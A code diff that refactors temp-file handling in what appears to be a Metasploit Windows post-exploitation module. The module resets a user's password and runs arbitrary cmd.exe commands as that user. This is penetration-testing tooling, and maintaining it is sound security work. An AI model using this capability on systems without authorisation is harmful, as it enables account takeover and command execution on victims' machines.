@@ -85,14 +85,15 @@ class MetasploitModule < Msf::Post
       fail_with(Failure::Unknown, 'Error resetting password') unless reset_pass(user, password)
     end
 
-    system_temp = get_env('WINDIR') << '\\Temp'
-    outpath = "#{system_temp}\\#{Rex::Text.rand_text_alpha(8)}.txt"
-
-    # Create output file and set permissions so everyone can access
-    touch(outpath) if cmdout
-
-    cmdstr = "cmd.exe /c #{cmd}"
-    cmdstr = "cmd.exe /c #{cmd} > #{outpath}" if cmdout
+    # If command output is requested, then create output file and set open permissions
+    if cmdout
+      system_temp = get_env('WINDIR') << '\\Temp'
+      outpath = "#{system_temp}\\#{Rex::Text.rand_text_alpha(8)}.txt"
+      touch(outpath)
+      cmdstr = "cmd.exe /c #{cmd} > #{outpath}"
+    else
+      cmdstr = "cmd.exe /c #{cmd}"
+    end
 
     # Check privs and execute the correct commands
     # if user use createprocesswithlogon, if system logonuser and createprocessasuser
@@ -119,11 +120,12 @@ class MetasploitModule < Msf::Post
       vprint_status("Thread Handle: #{pi[:thread_handle]}")
       vprint_status("Process Id: #{pi[:process_id]}")
       vprint_status("Thread Id: #{pi[:thread_id]}")
-      print_status("Command output:\r\n#{tmpout}") unless tmpout.nil?
+      print_status("Command output:\r\n#{tmpout}") if cmdout
     end
 
-    print_status("Cleaning up...")
-    print_status("Removing temp file #{outpath}")
-    rm_f(outpath)
+    if cmdout
+      print_status("Removing temp file #{outpath}")
+      rm_f(outpath)
+    end
   end
 end
